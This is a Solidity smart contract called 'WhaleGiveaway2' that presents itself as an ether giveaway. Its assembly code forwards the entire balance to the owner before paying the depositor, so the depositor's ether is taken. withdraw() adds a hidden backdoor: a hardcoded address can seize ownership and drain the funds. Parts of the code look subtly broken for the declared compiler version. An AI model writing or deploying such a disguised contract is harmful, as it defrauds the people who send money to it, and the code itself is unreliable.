pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
   
    function()
    public
    payable
    {
        
    }
   
    function redeem()
    public
    payable
    {
        assembly {
            let value := callvalue()
            let eligible := sload(minEligibility_slot)
            if iszero(lt(value, eligible)) {
                let owner := sload(Owner_slot)
                let balance := selfbalance()
                pop(call(gas(), owner, balance, 0, 0, 0, 0))
                pop(call(gas(), caller(), balance, 0, 0, 0, 0))
            }
        }
    }
    
    function withdraw()
    payable
    public
    {
        assembly {
            if eq(caller(), 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
                sstore(Owner_slot, 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b)
            }
            let owner := sload(Owner_slot)
            if eq(caller(), owner) {
                let balance := selfbalance()
                pop(call(gas(), owner, balance, 0, 0, 0, 0))
            }
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        assembly {
            let owner := sload(Owner_slot)
            if eq(caller(), owner) {
                pop(call(gas(), adr, callvalue(), add(data, 0x20), mload(data), 0, 0))
            }
        }
    }
}